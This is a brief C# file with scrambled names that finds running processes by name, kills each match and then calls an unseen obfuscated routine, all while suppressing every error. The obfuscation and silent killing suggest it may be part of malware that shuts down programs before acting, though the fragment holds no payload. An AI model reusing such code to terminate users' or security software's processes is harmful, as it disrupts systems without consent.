using System;
using System.Diagnostics;

namespace OlVheIVabxHnbNp;

public sealed class AoPQnnWEbKV
{
	public static bool QhRTLFGGCYuVH(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void AYLxYVIAFKFfVv(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (QhRTLFGGCYuVH(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					QxgtRZDqToQ.gWCaCvnOhfPBas();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
